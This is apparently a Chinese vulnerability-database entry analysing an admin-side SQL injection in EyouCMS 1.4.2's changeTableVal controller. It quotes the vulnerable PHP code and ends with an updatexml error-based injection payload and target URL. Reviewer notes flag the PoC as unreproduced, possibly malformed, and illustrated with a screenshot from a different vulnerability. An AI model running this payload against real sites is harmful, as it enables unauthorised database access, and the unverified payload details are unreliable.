---
source: "hatch 补库批 20260928"
product: "EyouCMS1.4.2 Index.changeTableVal"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Eyoucms 1.4.2 后台注入"
prerequisites: "来源所述条件，未列明部分仍待核：后台会话和AJAX POST；所选表字段可更新，DB updatexml错误显示"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-4aac3005ed5c78186a027bc0"
entity_id: "ve-4aac3005ed5c78186a027bc0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台会话和AJAX POST；所选表字段可更新，DB updatexml错误显示

- **凭据与会话边界（1）**：文本PoC未带X-Requested-With、field/value/会话；源码只在IS_AJAX_POST内运行。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **实验改动边界（2）**：id_value载荷用//连接不是文中解释的合法SQL空白/注释，须回原请求核对。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **证据待核（3）**：图引用1.0前台getshell资源；完整源码值得保留。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Eyoucms 1.4.2 后台注入

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 漏洞分析

/application/admin/controller/Index.php

    public function changeTableVal()
    {
        if (IS_AJAX_POST) {
            $url = null;
            $data = [
                'refresh'   => 0,
            ];
            $table = input('post.table/s'); // 表名
            $id_name = input('post.id_name/s'); // 表主键id名
            $id_value = input('post.id_value/s'); // 表主键id值
            $field  = input('post.field/s'); // 修改哪个字段
            $value  = input('post.value/s', '', null); // 修改字段值  
            switch ($table) {
                // 会员等级表
                case 'users_level':
                    {
                        $return = model('UsersLevel')->isRequired($id_name,$id_value,$field,$value);
                        if (is_array($return)) {
                            $this->error($return['msg']);
                        }
                    }
                    break;
                
                // 会员属性表
                case 'users_parameter':
                    {
                        $return = model('UsersParameter')->isRequired($id_name,$id_value,$field,$value);
                        if (is_array($return)) {
                            $this->error($return['msg']);
                        }
                    }
                    break;
                
                // 会员中心菜单表
                case 'users_menu':
                    {
                        Db::name('users_menu')->where('id','gt',0)->update([
                                'is_userpage'   => 0,
                                'update_time'   => getTime(),
                            ]);
                        $data['refresh'] = 1;
                    }
                    break;
                
                // 会员投稿功能
                case 'archives':
                    {
                        if ('arcrank' == $field) {
                            if (0 == $value) {
                                $value = -1;
                            }else{
                                $value = 0;
                            }
                        }
                    }
                    break;
                // 会员产品类型表
                case 'users_type_manage':
                    {
                        if (empty($value)) {
                            $this->error('不可为空');
                        }
                    }
                    break;
                default:
                    # code...
                    break;
            }
            $savedata = [
                $field => $value,
                'update_time'   => getTime(),
            ];
            M($table)->where("$id_name = $id_value")->cache(true,null,$table)->save($savedata); // 根据条件保存修改的数据
            // 以下代码可以考虑去掉，与行为里的清除缓存重复 AppEndBehavior.php / clearHtmlCache
            switch ($table) {
                case 'auth_modular':
                    extra_cache('admin_auth_modular_list_logic', null);
                    extra_cache('admin_all_menu', null);
                    break;
                
                default:
                    // 清除logic逻辑定义的缓存
                    extra_cache('admin_'.$table.'_list_logic', null);
                    // 清除一下缓存
                    // delFile(RUNTIME_PATH.'html'); // 先清除缓存, 否则不好预览
                    \think\Cache::clear($table);
                    break;
            }
            /*清除页面缓存*/
            // $htmlCacheLogic = new \app\common\logic\HtmlCacheLogic;
            // $htmlCacheLogic->clear_archives();
            /*--end*/
            
            $this->success('更新成功', $url, $data);
        }
    }

第307行：

    M($table)->where("$id_name = $id_value")->cache(true,null,$table)->save($savedata); // 根据条件保存修改的数据

直接将函数头获取的POST传入SQL语句里面：

    $table = input('post.table/s'); // 表名
    $id_name = input('post.id_name/s'); // 表主键id名
    $id_value = input('post.id_value/s'); // 表主键id值
    $field  = input('post.field/s'); // 修改哪个字段
    $value  = input('post.value/s', '', null); // 修改字段值

### 漏洞复现

payload：

    http://0-sec.org/eyou/?m=admin&c=Index&a=changeTableVal


    post:

    table=admin&id_name=admin_id&id_value='1'//and//updatexml(1,concat(0x7e,user(),0x7e),1)

![](./.resource/Eyoucms1.0前台getshell/media/rId26.png)

四、参考链接
------------

> http://www.f4ckweb.top/index.php/archives/47/
